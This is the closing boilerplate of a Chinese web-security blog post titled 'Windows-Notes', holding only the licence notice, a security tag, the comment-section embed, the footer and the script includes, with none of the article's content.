                    <p>更新日期：<a href="https://misakikata.github.io/2019/10/Windows-Notes/">October 11th 2019, 10:16:20 am</a>
                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                </div>
              
          <br><br>
          <div>
              <p>
                       
                      <span class="badge badge-default">#&nbsp;web安全</span>
                      &nbsp;
                      
              </p>
          </div>
        </div>
      </div>  
    </div>
  </div>
  <!-- TOC -->
  
      <div class="">
        <div id="toc">
          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
          <div id="tocbot"></div>
        </div>
      </div>
  
</div>


<!-- Comments -->
<div class="row">
    <div class="col-md-8 offset-md-2">
    
        
            <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>               
        var disqus_shortname = '';
        var disqus_config = function () {
            this.page.url = 'https://misakikata.github.io/2019/10/Windows-Notes/'; 
            this.page.identifier = '/2019/10/Windows-Notes/';
        };
        (function() { 
            var d = document, s = d.createElement('script');
            s.type = 'text/javascript';
            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
</div>
        
    
    </div>
</div>
  

<footer class="footer footer-default">
        <div class="container">
          <div class="float-left" style="padding: 15px 0;">
              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
          </div>
          <div align="right" style="padding: 15px 0;">
              <i class="iconfont icon-love" ></i>
              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
          </div>
        </div>
</footer>
      <!--   Core JS Files   -->
      
<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>

      
<script src="/js/main.js"></script>

      
<script src="/js/core/popper.min.js"></script>

      
<script src="/js/core/bootstrap-material-design.min.js"></script>

      
<script src="/js/plugins/moment.min.js"></script>

      
<script src="/js/material-kit.min.js?v=2.0.5.js"></script>

      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
        
<script src="/js/post.js"></script>

        
<script src="/js/plugins/prettify.js"></script>

        <script>
            $(document).ready(function(){
                $('pre').addClass('prettyprint linenums');
                prettyPrint();
            })
        </script>
      
<script src="/live2d-widget/autoload.js"></script>
</body>
</html>